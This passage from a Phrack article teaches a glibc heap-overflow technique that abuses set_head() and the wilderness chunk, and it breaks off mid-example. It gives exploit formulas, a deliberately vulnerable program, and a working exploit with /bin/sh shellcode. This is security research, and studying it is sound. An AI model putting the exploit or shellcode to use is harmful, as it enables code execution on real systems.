            _                                                    _
          _/B\_                                                _/W\_
          (* *)                Phrack #64 file 9               (* *)
          | - |                                                | - |
          |   |  The use of set_head to defeat the wilderness  |   |
          |   |                                                |   |
          |   |                    By g463                     |   |
          |   |                                                |   |
          |   |          jean-sebastien@guay-leroux.com        |   |
          (________________________________________________________)


1 - Introduction

2 - The set_head() technique
  2.1 - A look at the past - "The House of Force" technique
  2.2 - The basics of set_head()
  2.3 - The details of set_head()

3 - Automation
  3.1 - Define the basic properties
  3.2 - Extract the formulas
  3.3 - Compute the values

4 - Limitations
  4.1 - Requirements of two different techniques
      4.1.1 - The set_head() technique
      4.1.2 - The "House of Force" technique
  4.2 - Almost 4 bytes to almost anywhere technique
      4.2.1 - Everything in life is a multiple of 8
      4.2.2 - Top chunk's size needs to be bigger than the requested malloc
              size
      4.2.3 - Logical OR with PREV_INUSE

5 - Taking set_head() to the next level
  5.1 - Multiple overwrites
  5.2 - Infoleak

6 - Examples
  6.1 - The basic scenarios
      6.1.1.1 - The most basic form of the set_head() technique
      6.1.1.2 - Exploit
      6.1.2.1 - Multiple overwrites
      6.1.2.2 - Exploit
  6.2 - A real case scenario: file(1) utility
      6.2.1 - The hole
      6.2.2 - All the pieces fall into place
      6.2.3 - hanuman.c

7 - Final words

8 - References


--[ 1 - Introduction

Many papers have been published in the past describing techniques on how to
take advantage of the inbound memory management in the GNU C Library
implementation.  A first technique was introduced by Solar Designer in his
security advisory on a flaw in the Netscape browser[1].  Since then, many
improvements have been made by many different individuals ([2], [3], [4],
[5], [6] just to name a few).  However, there is always one situation that
gives a lot more trouble than others.  Anyone who has already tried to take
advantage of that situation will agree. How to take control of a vulnerable
program when the only critical information that you can overwrite is the
header of the wilderness chunk?

The set_head technique is a new way to obtain a "write almost 4 arbitrary
bytes to almost anywhere" primitive. It was born because of a bug in the
file(1) utility that the author was unable to exploit with existing
techniques.

This paper will present the details of the technique.  Also, it will show
you how to practically apply this technique to other exploits.  The
limitations of the technique will also be presented.  Finally, some
examples will be shown to better understand the various aspects of the
technique.


--[ 2 - The set_head() technique

Most of the time, people who write exploits using malloc techniques are not
aware of the difficulties that the wilderness chunk implies until they face
the problem.  It is only at this exact time that they realize how the known
techniques (i.e. unlink, etc.) have no effect on this particular context.

As MaXX once said [3]: "The wilderness chunk is one of the most dangerous
opponents of the attacker who tries to exploit heap mismanagement. Because
this chunk of memory is handled specially by the dlmalloc internal
routines, the attacker will rarely be able to execute arbitrary code if
they solely corrupt the boundary tag associated with the wilderness chunk."


----[ 2.1 - A look at the past - "The House of Force" technique

To better understand the details of the set_head() technique explained in
this paper, it would be helpful to first understand what has already been
done on the subject of exploiting the top chunk.

This is not the first time that the exploitation of the wilderness chunk
has been specifically targeted.  The pioneer of this type of exploitation
is Phantasmal Phantasmagoria.

He first wrote an article entitled "Exploiting the wilderness" about it in
2004.  Details of this technique are out of scope for the current paper,
but you can learn more about it by reading his paper [5].

He gave a second try at exploiting the wilderness in his excellent paper
"Malloc Maleficarum" [4].  He named his technique "The House of Force".  To
better understand the set_head() technique, the "House of Force" is
described below.

The idea behind "The House of Force" is quite simple but there are specific
steps that need to be followed.  Below, you will find a brief summary of
all the steps.


Step one:

The first step in the "House of Force" consists in overflowing the size
field of the top chunk to make the malloc library think it is bigger than
it actually is.  The preferred new size of the top chunk should be
0xffffffff.  Below is a an ascii graphic of the memory layout at the time
of the overflow.  Notice that the location of the top chunk is somewhere in
the heap.


                0xbfffffff  -> +-----------------+
                               |                 |
                               |     stack       |
                               |                 |
                               :                 :
                               :                 :
                               .                 .
                               :                 :
                               :                 :
                               |                 |
                               |                 |
                               |      heap       |<--- Top chunk
                               |                 |
                               +-----------------+
                               |  global offset  |
                               |      table      |
                               +-----------------+
                               |                 |
                               |                 |
                               |      text       |
                               |                 |
                               |                 |
                0x08048000  -> +-----------------+


Step two:

After this, a call to malloc with a user-supplied size should be issued.
With this call, the top chunk will be split in two parts.  One part will be
returned to the user, and the other part will be the remainder chunk (the
top chunk).

The purpose of this step is to move the top chunk right before a global
offset table entry.  The new location of the top chunk is the sum of the
current address of the top chunk and the value of the malloc call.  This
sum is done with the following line of code:

        --[ From malloc.c

        remainder = chunk_at_offset(victim, nb);

After the malloc call, the memory layout should be similar to the
representation below:


                0xbfffffff  -> +-----------------+
                               |                 |
                               |     stack       |
                               |                 |
                               :                 :
                               :                 :
                               .                 .
                               :                 :
                               :                 :
                               |                 |
                               |                 |
                               |      heap       |
                               |                 |
                               +-----------------+
                               |  global offset  |
                               |      table      |
                               +-----------------+<--- Top chunk
                               |                 |
                               |                 |
                               |      text       |
                               |                 |
                               |                 |
                0x08048000  -> +-----------------+


Step three:

Finally, another call to malloc needs to be done.  This one needs to be
large enough to trigger the top chunk code.  If the user has some sort of
control over the content of this buffer, he can then overwrite entries
inside the global offset table and he can seize control of the process.
Look at the following representation for the current memory layout at the
time of the allocation:


                0xbfffffff  -> +-----------------+
                               |                 |
                               |     stack       |
                               |                 |
                               :                 :
                               :                 :
                               .                 .
                               :                 :
                               :                 :
                               |                 |
                               |                 |
                               |      heap       |<---- Top chunk
                               |                 |---+
                               +-----------------+   |
                               |  global offset  |   |- Allocated memory
                               |      table      |   |
                               +-----------------+---+
                               |                 |
                               |                 |
                               |      text       |
                               |                 |
                               |                 |
                0x08048000  -> +-----------------+


----[ 2.2 - The basics of set_head()

Now that the basic review of the "House of Force" technique is done, let's
look at the set_head() technique.  The basic idea behind this technique is
to use the set_head() macro to write almost four arbitrary bytes to almost
anywhere in memory.  This macro is normally used to set the value of the
size field of a memory chunk to a specific value.  Let's have a peak at the
code:

        --[ From malloc.c:

        /* Set size/use field */
        #define set_head(p, s)       ((p)->size = (s))


This line is very simple to understand.  It takes the memory chunk 'p',
modifies its size field and replace it with the value of the variable 's'.
If the attacker has control of those two parameters, it may be possible to
modify the content of an arbitrary memory location with a value that he
controls.

To trigger the particular call to set_head() that could lead to this
arbitrary overwrite, two specific steps need to be followed.  These steps
are described below.


First step:

The first step of the set_head() technique consists in overflowing the size
field of the top chunk to make the malloc library think it is bigger than
it actually is.  The specific value that you will overwrite with will
depend on the parameters of the exploitable situation.  Below is an ascii
graphic of the memory layout at the time of the overflow.  Notice that the
location of the top chunk is somewhere in the heap.


                0xbfffffff  -> +-----------------+
                               |                 |
                               |      stack      |
                               |                 |
                               :                 :
                               :                 :
                               .                 .
                               :                 :
                               :                 :
                               |                 |
                               |                 |
                               |      heap       |<--- Top chunk
                               |                 |
                               +-----------------+
                               |                 |
                               |      data       |
                               |                 |
                               +-----------------+
                               |                 |
                               |                 |
                               |      text       |
                               |                 |
                               |                 |
                0x08048000  -> +-----------------+


Second step:

After this, a call to malloc with a user-supplied size should be issued.
With this call, the top chunk will be split in two parts.  One part will be
returned to the user, and the other part will be the remainder chunk (the
top chunk).

The purpose of this step is to move the top chunk before the location that
you want to overwrite.  This location needs to be on the stack, and you
will see why at section 4.2.2.  During this step, the malloc code will set
the size of the new top chunk with the set_head() macro.  Look at the
representation below to better understand the memory layout at the time of
the overwrite:


                0xbfffffff  -> +-----------------+
                               |                 |
                               |      stack      |
                               |                 |
                               +-----------------+
                               | size of topchunk|
                               +-----------------+
                               |prev_size not use|
                               +-----------------+<--- Top chunk
                               |                 |
                               :                 :
                               :                 :
                               .                 .
                               :                 :
                               :                 :
                               |                 |
                               |                 |
                               |      heap       |
                               |                 |
                               +-----------------+
                               |                 |
                               |      data       |
                               |                 |
                               +-----------------+
                               |                 |
                               |                 |
                               |      text       |
                               |                 |
                               |                 |
                0x08048000  -> +-----------------+


If you control the new location of the top chunk and the new size of the
top chunk, you can get a "write almost 4 arbitrary bytes to almost
anywhere" primitive.


----[ 2.3 - The details of set_head()

The set_head macro is used many times in the malloc library.  However, it's
used at a particularly interesting emplacement where it's possible to
influence its parameters.  This influence will let the attacker overwrite 4
bytes in memory with a value that he can control.

When there is a call to malloc, different methods are tried to allocate the
requested memory.  MaXX did a pretty great job at explaining the malloc
algorithm in section 3.5.1 of his text[3].  Reading his text is highly
suggested before continuing with this text.  Here are the main points of
the algorithm:

        1. Try to find a chunk in the bin corresponding to the size of the
           request;

        2. Try to use the remainder chunk;

        3. Try to find a chunk in the regular bins.


If those three steps fail, interesting things happen.  The malloc function
tries to split the top chunk.  The 'use_top' code portion is then called.
It's in that portion of code that it's possible to take advantage of a call
to set_head().  Let's analyze the use_top code:

--[ From malloc.c

01 Void_t*
02 _int_malloc(mstate av, size_t bytes)
03 {
04   INTERNAL_SIZE_T nb;               /* normalized request size */
05
06   mchunkptr       victim;           /* inspected/selected chunk */
07   INTERNAL_SIZE_T size;             /* its size */
08
09   mchunkptr       remainder;        /* remainder from a split */
10   unsigned long   remainder_size;   /* its size */
11
12
13   checked_request2size(bytes, nb);
14
15 [ ... ]
16
17     use_top:
18
19     victim = av->top;
20     size = chunksize(victim);
21
22     if ((unsigned long)(size) >= (unsigned long)(nb + MINSIZE)) {
23       remainder_size = size - nb;
24       remainder = chunk_at_offset(victim, nb);
25       av->top = remainder;
26       set_head(victim, nb | PREV_INUSE |
27                (av != &main_arena ? NON_MAIN_ARENA : 0));
28       set_head(remainder, remainder_size | PREV_INUSE);
29
30       check_malloced_chunk(av, victim, nb);
31       return chunk2mem(victim);
32     }


All the magic happens at line 28.  By forcing a particular context inside
the application, it's possible to control set_head's parameters and then
overwrite almost any memory addresses with almost four arbitrary bytes.

Let's see how it's possible to control these two parameters, which are
'remainder' and 'remainder_size' :


        1. How to get control of 'remainder_size':

           a. At line 13, 'nb' is filled with the normalized size of the
              value of the malloc call.  The attacker should have control
              on the value of this malloc call.

           b. Remember that this technique requires that the size field of
              the top chunk needs to be overwritten by the overflow.  At
              line 19 & 20, the value of the overwritten size field of the
              top chunk is getting loaded in 'size'.

           c. At line 22, a check is done to ensure that the top chunk is
              large enough to take care of the malloc request.  The
              attacker needs that this condition evaluates to true to reach
              the set_head() macro at line 28.

           d. At line 23, the requested size of the malloc call is
              subtracted from the size of the top chunk.  The remaining
              value is then stored in 'remainder_size'.


        2. How to get control of 'remainder':

           a. At line 13, 'nb' is filled with the normalized size of the
              value of the malloc call.  The attacker should have control
              of the value of this malloc call.

           b. Then, at line 19, the variable 'victim' gets filled with the
              address of the top chunk.

           c. After this, at line 24, chunk_at_offset() is called.  This
              macro adds the content of 'nb' to the value of 'victim'.  The
              result will be stored in 'remainder'.


Finally, at line 28, the set_head() macro modifies the size field of the
fake remainder chunk and fills it with the content of the variable
'remainder_size'.  This is how you get your "write almost 4 arbitrary bytes
to almost anywhere in memory" primitive.


--[ 3 - Automation

It was explained in section 2.3 that the variables 'remainder' and
'remainder_size' will be used as parameters to the set_head macro.  The
following steps will explain how to proceed in order to get the desired
value in those two variables.


----[ 3.1 - Define the basic properties

Before trying to exploit a security hole with the set_head technique, the
attacker needs to define the parameters of the vulnerable context.  These
parameters are:

        1. The return location:  This is the location in memory that you
           want to write to.  It is often referred as 'retloc' through this
           paper.

        2. The return address: This is the content that you will write to
           your return location.  Normally, this will be a memory address
           that points to your shellcode.  It is often referred as 'retadr'
           through this paper.

        3. The location of the topchunk: To use this technique, you must
           know the exact position of the top chunk in memory.  This
           location is often referred as 'toploc' through this paper.


----[ 3.2 - Extract the formulas

The attacker has control on two things during the exploitation stage.
First, the content of the overwritten top chunk's size field and secondly,
the size parameter to the malloc call.  The values that the attacker
chooses for these will determine the exact content of the variables
'remainder' and 'remainder_size' later used by the set_head() macro.

Below, two formulas are presented to help the attacker find the appropriate
values.


        1. How to get the value for the malloc parameter:

           a. The following line is taken directly from the malloc.c code:

              remainder = chunk_at_offset(victim, nb)

           b. 'nb' is the normalized value of the malloc call.  It's the
              result of the macro request2size().  To make things simpler,
              let's add 8 to this value to take care of this macro:

              remainder = chunk_at_offset(victim, nb + 8)

           c. chunk_at_offset() adds the normalized size 'nb' to the top
              chunk's location:

              remainder = toploc + (nb + 8)

           e. 'remainder' is the return location (i.e. 'retloc') and 'nb'
              is the malloc size (i.e. 'malloc_size'):

              retloc = toploc + (malloc_size + 8)

           d. Isolate the 'malloc_size' variable to get the final formula:

              malloc_size = (retloc - toploc - 8)


        2. The second formula is how to get the new size of the top chunk.

           a. The following line is taken directly from the malloc.c code:

              remainder_size = size - nb;

           b. 'size' is the size of the top chunk (i.e. 'topchunk_size'),
              and 'nb' is the normalized parameter of the malloc call
              (i.e. 'malloc_size'):

              remainder_size = topchunk_size - malloc_size

           c. 'remainder_size' is in fact the return address
              (i.e. retadr'):

              retadr = topchunk_size - malloc_size

           d. Isolate 'topchunk_size' to get the final formula:

              topchunk_size = retadr + malloc_size

           e. topchunk_size will get its three least significant bits
              cleared by the macro chunksize().  Let's consider this in the
              formula by adding 8 to the right side of the equation:

              topchunk_size = (retadr + malloc_size + 8)

           g. Take into consideration that the PREV_INUSE flag is being set
              in the set_head() macro:

              topchunk_size = (retadr + malloc_size + 8) | PREV_INUSE


----[ 3.3 - Compute the values

You now have the two basic formulas:

        1. malloc_size = (retloc - toploc - 8)

        2. topchunk_size = (retadr + malloc_size + 8) | PREV_INUSE

You can now proceed with finding the exact values that you will plug into
your exploit.

To facilitate the integration of those formulas in your exploit code, you
can use the set_head_compute() function found in the file(1) utility
exploit code (refer to section 6.2.3).  Here is the prototype of the
function:

        struct sethead * set_head_compute
            (unsigned int retloc, unsigned int retadr, unsigned int toploc)


The structure returned by the function set_head_compute() is defined this
way:

        struct sethead {
            unsigned long topchunk_size;
            unsigned long malloc_size;
        }


By giving this function your return location, your return address and your
top chunk location, it will compute the exact malloc size and top chunk
size to use in your exploit.  It will also tell you if it's possible to
execute the requested write operation based on the return address and the
return location you have chosen.


--[ 4 - Limitations

At the time of writing this paper, there was no simple and easy way to
exploit a heap overflow when the top chunk is involved.  Each exploitation
technique needs a particular context to work successfully.  The set_head
technique is no different.  It has some requirements to work properly.

Also, it's not a real "write 4 arbitrary bytes to anywhere" primitive.  In
fact, it would be more of a "write almost 4 arbitrary bytes to almost
anywhere in memory" primitive.


----[ 4.1 - Requirements of two different techniques

Specific elements need to be present to exploit a situation in which the
wilderness chunk is involved.  These elements tend to impose a lot of
constraints when trying to exploit a program.  Below, the requirements for
the set_head technique are listed, alongside those of the "House of Force"
technique. As you will see, each technique has its pros and cons.


------[ 4.1.1 - The set_head() technique

Minimum requirements:

        1. The size field of the topchunk needs to be overwritten with a
           value that the attacker can control;

        2. Then, there is a call to malloc with a parameter that the
           attacker can control;

This technique will let you write almost 4 arbitrary bytes to almost
anywhere.


------[ 4.1.2 The "House of Force" technique

Minimum requirements:

        1. The size field of the topchunk must be overwritten with a very
           large value;

        2. Then, there must be a first call to malloc with a very large
           size.  An important point is that this same allocated buffer
           should only be freed after the third step.

        3. Finally, there should be a second call to malloc.  This buffer
           should then be filled with some user supplied data.

This technique will, in the best-case scenario, let you overwrite any
region in memory with a string of an arbitrary length that you control.


----[ 4.2 - Almost 4 bytes to almost anywhere technique

This set_head technique is not really a "write 4 arbitrary bytes anywhere
in memory" primitive.  There are some restrictions in malloc.c that greatly
limit the possible values an attacker can use for the return location and
the return address in an exploit.  Still, it's possible to run arbitrary
code if you carefully choose your values.

Below you will find the three main restrictions of this technique:


------[ 4.2.1 - Everything in life is a multiple of 8

A disadvantage of the set_head technique is the presence of macros that
ensure memory locations and values are a multiple of 8 bytes.  These macros
are:

    - checked_request2size() and
    - chunksize()

Ultimately, this will have some influence on the selection of the return
location and the return address.

The memory addresses that you can overwrite with the set_head technique
need to be aligned on a 8 bytes boundary.  Interesting locations to
overwrite on the stack usually include a saved EIP of a stack frame or a
function pointer. These pointers are aligned on a 4 bytes boundary, so with
this technique, you will be able to modify one memory address on two.

The return address will also need to be a multiple of 8 (not counting the
logical OR with PREV_INUSE).  Normally, the attacker has the possibility of
providing a NOP cushion right before his shellcode, so this is not really a
big issue.


------[ 4.2.2 - Top chunk's size needs to be bigger than the requested
                malloc size

This is the main disadvantage of the set_head technique.  For the top chunk
code to be triggered and serve the memory request, there is a verification
before the top chunk code is executed:

        --[ From malloc.c

        if ((unsigned long)(size) >= (unsigned long)(nb + MINSIZE)) {

In short, this line requires that the size of the top chunk is bigger than
the size requested by the malloc call.  Since the variable 'size' and 'nb'
are computed from the return location, the return address and the top
chunk's location, it will greatly limit the content and the location of the
arbitrary overwrite operation.  There is still a valid combination of a
return address and a return location that exists.

Let's see what the value of 'size' and 'nb' for a given return location and
return address will be.  Let's find out when there is a situation in which
'size' is greater than 'nb'.  Consider the fact that the location of the
top chunk is static and it's at 0x080614f8:

        +------------+------------++------------+------------+
        |   return   |   return   ||    size    |     nb     |
        |  location  |   address  ||            |            |
        +------------+------------++------------+------------+
        | 0x0804b150 | 0x08061000 ||  134523993 | 4294876240 |
        | 0x0804b150 | 0xbffffbaa || 3221133059 | 4294876240 |
        | 0xbffffaaa | 0xbffffbaa || 2012864861 | 3086607786 |
        | 0xbffffaaa | 0x08061000 || 3221222835 | 3086607786 | <- !!!!!
        +------------+------------++------------+------------+

As you can see from this chart, the only time that you get a situation
where 'size' is greater than 'nb' is when your return location is somewhere
in the stack and when your return address is somewhere in the heap.


------[ 4.2.3 - Logical OR with PREV_INUSE

When the set_head macro is called, 'remainder_size', which is the return
address, will be altered by a logical OR with the flag PREV_INUSE:

        --[ From malloc.c

        #define PREV_INUSE 0x1

        set_head(remainder, remainder_size | PREV_INUSE);

It was said in section 4.2.1 that the return address will always be a
multiple of 8 bytes due to the normalisation of some macros.  With the
PREV_INUSE logical OR, it will be a multiple of 8 bytes, plus 1.  With an
NOP cushion, this problem is solved.  Compared to the previous two, this
restriction is a very small one.


--[ 5 - Taking set_head() to the next level

As a general rule, hackers try to make their exploit as reliable as
possible.  Exploiting a vulnerability in a confined lab and in the wild are
two different things.  This section will try to present some techniques to
improve the reliability of the set_head technique.


----[ 5.1 - Multiple overwrites

One way to make the exploitation process a lot more reliable is by using
multiple overwrites.  Indeed, having the possibility of overwriting a
memory location with 4 bytes is good, but the possibility to write multiple
times to memory is even better[8].  Being able to overwrite multiple memory
locations with set_head will increase your chance of finding a valid return
location on the stack.

A great advantage of the set_head technique is that it does not corrupt
internal malloc information in a way that prevents the program from working
properly.  This advantage will let you safely overwrite more than one
memory location.

To correctly put this technique in place, the attacker will need to start
overwriting addresses at the top of the stack, and go downward until he
seizes control of the program.  Here are the possible addresses that
set_head() lets you overwrite on the stack:

        1: 0xbffffffc
        2: 0xbffffff4
        3: 0xbfffffec
        4: 0xbfffffe4
        5: 0xbfffffdc
        6: 0xbfffffd4
        7: 0xbfffffcc
        8: 0xbfffffc4
        9: ...

Eventually, the attacker will fall on a memory location which is a saved
EIP in a stack frame.  If he's lucky enough, this new saved EIP will be
popped in the EIP register.

Remember that for a successfull overwrite, the attacker needs to do two
things:

        1. Overwrite the top chunk with a specific value;
        2. Make a call to malloc with a specific value.

Based on the formulas that were found in section 3.3, let's compute the
values for the top chunk size and the size for the malloc call for each
overwrite operation.  Let's take the following values for an example case:

        The location of the top chunk:        0x08050100
        The return address:                   0x08050200
        The return location:                  Decrementing from 0xbffffffc
                                              to 0xbfffffc4

         +------------++------------+------------+
         |   return   || top chunk  |   malloc   |
         |  location  ||   size     |    size    |
         +------------++------------+------------+
         +------------++------------+------------+
         | 0xbffffffc || 3221225725 | 3086679796 |
         | 0xbffffff4 || 3221225717 | 3086679788 |
         | 0xbfffffec || 3221225709 | 3086679780 |
         | 0xbfffffe4 || 3221225701 | 3086679772 |
         | 0xbfffffdc || 3221225693 | 3086679764 |
         | 0xbfffffd4 || 3221225685 | 3086679756 |
         | 0xbfffffcc || 3221225677 | 3086679748 |
         | 0xbfffffc4 || 3221225669 | 3086679740 |
         |     ...    ||     ...    |     ...    |
         +------------++------------+------------+

By looking at this chart, you can determine that for each overwrite
operation, the attacker would need to overwrite the size of the top chunk
with a new value and make a call to malloc with an arbitrary value.  Would
it be possible to improve this a little bit?  It would be great if the only
thing you needed to change between each overwrite operation was the size of
the malloc call, leaving the size of the top chunk untouched.

Indeed, it's possible.  Look closely at the functions used to compute
malloc_size and topchunk_size.  Let's say the attacker has only one
possibility to overwrite the size of the top chunk, would it still be
possible to do multiple overwrites using the set_head technique while
keeping the same size for the top chunk?

        1. malloc_size = (retloc - toploc - 8)
        2. topchunk_size = (retadr + malloc_size + 8) | PREV_INUSE

If you look at how 'topchunk_size' is computed, it seems possible.  By
changing the value of 'retloc', it will affect 'malloc_size'. Then,
'malloc_size' is used to compute 'topchunk_size'.  By playing with 'retadr'
in the second formula, you can always hit the same 'topchunk_size'.  Let's
look at the same example, but this time with a changing return address.
While the return location is decrementing by 8, let's increment the return
address by 8.


        +------------+-----------++------------+------------+
        |   return   |  return   || top chunk  |   malloc   |
        |  location  |  address  ||   size     |    size    |
        +------------+-----------++------------+------------+
        +------------+-----------++------------+------------+
        | 0xbffffffc | 0x8050200 || 3221225725 | 3086679796 |
        | 0xbffffff4 | 0x8050208 || 3221225725 | 3086679788 |
        | 0xbfffffec | 0x8050210 || 3221225725 | 3086679780 |
        | 0xbfffffe4 | 0x8050218 || 3221225725 | 3086679772 |
        | 0xbfffffdc | 0x8050220 || 3221225725 | 3086679764 |
        | 0xbfffffd4 | 0x8050228 || 3221225725 | 3086679756 |
        | 0xbfffffcc | 0x8050230 || 3221225725 | 3086679748 |
        | 0xbfffffc4 | 0x8050238 || 3221225725 | 3086679740 |
        |    ...     |    ...    ||     ...    |     ...    |
        +------------+-----------++------------+------------+

You can see that the size of the top chunk is always the same.  On the
other hand, the return address changes through the multiple overwrites.
The attacker needs to have an NOP cushion big enough to adapt to this
variation.

Refer to section 6.1.2.1 to get a sample vulnerable scenario exploitable
with multiple overwrites.


----[ 5.2 - Infoleak

As was stated in the Shellcoder's Handbook[9]: "An information leak can
make even a difficult bug possible".  Most of the time, people who write
exploits try to make them as reliable as possible.  If hackers, using an
infoleak technique, can improve the reliability of the set_head technique,
well, that's pretty good.  The technique is already hard to use because it
relies on unknown memory locations, which are:

        - The return location
        - The top chunk location
        - The return address

When there is an overwrite operation, if the attacker is able to tell if
the program has crashed or not, he can turn this to his advantage.  Indeed,
this knowledge could help him find one parameter of the exploitable
situation, which is the top chunk location.

The theory behind this technique is simple.  If the attacker has the real
address of the top chunk, he will be able to write at the address
0xbffffffc but not at the address 0xc0000004.

Indeed, a write operation at the address 0xbffffffc will work because this
address is in the stack and its purpose is to store the environment
variables of the program.  It does not significantly affect the behaviour
of the program, so the program will still continue to run normally.

On the other hand, if the attacker wrote in memory starting from
0xc0000000, there will be a segmentation fault because this memory region
is not mapped.  After this violation, the program will crash.

To take advantage of this behaviour, the attacker will have to do a series
of write operations while incrementing or decrementing the location of the
top chunk.  For each top chunk location tried, there should be 6 write
operations.

Below, you will find the parameters of the exploitable situation to use
during the 6 write operations.  The expected result is in the right column
of the chart.  If you get these results, then the value used for the
location of the top chunk is the right one.

        +------------+------------++--------------+
        |  return    |   return   ||    Did it    |
        |  location  |   address  ||   segfault ? |
        +------------+------------++--------------+
        +------------+------------++--------------+
        | 0xc0000014 | 0x07070707 ||     Yes      |
        | 0xc000000c | 0x07070707 ||     Yes      |
        | 0xc0000004 | 0x07070707 ||     Yes      |
        | 0xbffffffc | 0x07070707 ||     No       |
        | 0xbffffff4 | 0x07070707 ||     No       |
        | 0xbfffffec | 0x07070707 ||     No       |
        +------------+------------++--------------+

If the six write operations made the program segfault each time, then the
attacker is probably writing after 0xbfffffff or below the limit of the
stack.

If the 6 write operations succeeded and the program did not crash, then it
probably means that the attacker overwrote some values in the stack.  In
that case, decrement the value of the top chunk location to use.


--[ 6 - Examples

The best way to learn something new is probably with the help of examples.
Below, you will find some vulnerable codes and their exploits.

A scenario-based approach is taken here to demonstrate the exploitability
of a situation.  Ultimately, the exploitability of a context can be defined
by specific characterictics.

Also, the application of the set_head() technique on a real life example is
shown with the file(1) utility vulnerability.  The set_head technique was
found to exploit this specific vulnerability.


----[ 6.1 - The basic scenarios

To simplify things, it's useful to define exploitable contexts in terms of
scenarios.  For each specific scenario, there should be a specific way to
exploit it.  Once the reader has learned those scenarios, he can then match
them with vulnerable situations in softwares.  He will then know exactly
what approach to use to make the most out of the vulnerability.


------[ 6.1.1.1 - The most basic form of the set_head() technique

This scenario is the most basic form of the application of the set_head()
technique.  This is the approach that was used in the file(1) utility
exploit.

--------------------------- scenario1.c -----------------------------------
        #include <stdio.h>
        #include <stdlib.h>

        int main (int argc, char *argv[]) {

                char *buffer1;
                char *buffer2;
                unsigned long size;

/* [1] */       buffer1 = (char *) malloc (1024);
/* [2] */       sprintf (buffer1, argv[1]);

                size = strtoul (argv[2], NULL, 10);

/* [3] */       buffer2 = (char *) malloc (size);

                return 0;
        }
--------------------------- end of scenario1.c ----------------------------

Here is a brief description of the important lines in this code:

[1]: The top chunk is split and a memory region of 1024 bytes is requested.

[2]: A sprintf call is made.  The destination buffer is not checked to see
     if it is large enough.  The top chunk can then be overwritten here.

[3]: A call to malloc with a user-supplied size is done.


------[ 6.1.1.2 - Exploit

--------------------------- exp1.c ----------------------------------------
/*
   Exploit for scenario1.c
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>


// The following #define are from malloc.c and are used
// to compute the values for the malloc size and the top chunk size.
#define PREV_INUSE 0x1
#define SIZE_BITS  0x7       // PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA
#define SIZE_SZ (sizeof(size_t))
#define MALLOC_ALIGNMENT (2 * SIZE_SZ)
#define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)
#define MIN_CHUNK_SIZE 16
#define MINSIZE (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) \
    & ~MALLOC_ALIGN_MASK))
#define request2size(req) (((req) + SIZE_SZ + MALLOC_ALIGN_MASK \
    < MINSIZE)?MINSIZE : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) \
    & ~MALLOC_ALIGN_MASK)


struct sethead {
    unsigned long topchunk_size;
    unsigned long malloc_size;
};


/* linux_ia32_exec -  CMD=/bin/sh Size=68 Encoder=PexFnstenvSub
   http://metasploit.com */
unsigned char scode[] =
"\x31\xc9\x83\xe9\xf5\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x27"
"\xe2\xc0\xb3\x83\xeb\xfc\xe2\xf4\x4d\xe9\x98\x2a\x75\x84\xa8\x9e"
"\x44\x6b\x27\xdb\x08\x91\xa8\xb3\x4f\xcd\xa2\xda\x49\x6b\x23\xe1"
"\xcf\xea\xc0\xb3\x27\xcd\xa2\xda\x49\xcd\xb3\xdb\x27\xb5\x93\x3a"
"\xc6\x2f\x40\xb3";


struct sethead * set_head_compute
    (unsigned long retloc, unsigned long retadr, unsigned long toploc) {

    unsigned long check_retloc, check_retadr;
    struct sethead *shead;

    shead = (struct sethead *) malloc (8);
    if (shead == NULL) {
        fprintf (stderr,
            "--[ Could not allocate memory for sethead structure\n");
        exit (1);
    }

    if ( (toploc % 8) != 0 ) {
        fprintf (stderr,
            "--[ Impossible to use 0x%x as the top chunk location.",
            toploc);

        toploc = toploc - (toploc % 8);
        fprintf (stderr, "  Using 0x%x instead\n", toploc);
    } else
        fprintf (stderr,
            "--[ Using 0x%x as the top chunk location.\n", toploc);

    // The minus 8 is to take care of the normalization
    // of the malloc parameter
    shead->malloc_size = (retloc - toploc - 8);

    // By adding the 8, we are able to sometimes perfectly hit
    // the return address.  To hit it perfectly, retadr must be a multiple
    // of 8 + 1 (for the PREV_INUSE flag).
    shead->topchunk_size = (retadr + shead->malloc_size + 8) | PREV_INUSE;

    if (shead->topchunk_size < shead->malloc_size) {
        fprintf (stderr,
            "--[ ERROR: topchunk size is less than malloc size.\n");
        fprintf (stderr, "--[ Topchunk code will not be triggered\n");
        exit (1);
    }

    check_retloc = (toploc + request2size (shead->malloc_size) + 4);
    if (check_retloc != retloc) {
        fprintf (stderr,
            "--[ Impossible to use 0x%x as the return location. ", retloc);
        fprintf (stderr, "Using 0x%x instead\n", check_retloc);
    } else
        fprintf (stderr, "--[ Using 0x%x as the return location.\n",
            retloc);

    check_retadr = ( (shead->topchunk_size & ~(SIZE_BITS))
        - request2size (shead->malloc_size)) | PREV_INUSE;
    if (check_retadr != retadr) {
        fprintf (stderr,
            "--[ Impossible to use 0x%x as the return address.", retadr);
        fprintf (stderr, " Using 0x%x instead\n", check_retadr);
    } else
        fprintf (stderr, "--[ Using 0x%x as the return address.\n",
            retadr);

    return shead;
}


void
put_byte (char *ptr, unsigned char data) {
    *ptr = data;
}


void
put_longword (char *ptr, unsigned long data) {
    put_byte (ptr, data);
    put_byte (ptr + 1, data >> 8);
    put_byte (ptr + 2, data >> 16);
    put_byte (ptr + 3, data >> 24);
}


int main (int argc, char *argv[]) {

        char *buffer;
        char malloc_size_string[20];
        unsigned long retloc, retadr, toploc;
        unsigned long topchunk_size, malloc_size;
        struct sethead *shead;

        if ( argc != 4) {
                printf ("wrong number of arguments, exiting...\n\n");
                printf ("%s <retloc> <retadr> <toploc>\n\n", argv[0]);
                return 1;
        }

        sscanf (argv[1], "0x%x", &retloc);
        sscanf (argv[2], "0x%x", &retadr);
        sscanf (argv[3], "0x%x", &toploc);

        shead = set_head_compute (retloc, retadr, toploc);
        topchunk_size = shead->topchunk_size;
        malloc_size = shead->malloc_size;

        buffer = (char *) malloc (1036);

        memset (buffer, 0x90, 1036);
        put_longword (buffer+1028, topchunk_size);
        memcpy (buffer+1028-strlen(scode), scode, strlen (scode));
        buffer[1032]=0x0;

        snprintf (malloc_size_string, 20, "%u", malloc_size);
        execl ("./scenario1", "scenario1", buffer, malloc_size_string,
            NULL);

        return 0;
}
--------------------------- end of exp1.c ---------------------------------

Here are the steps to find the 3 memory values to use for this exploit.


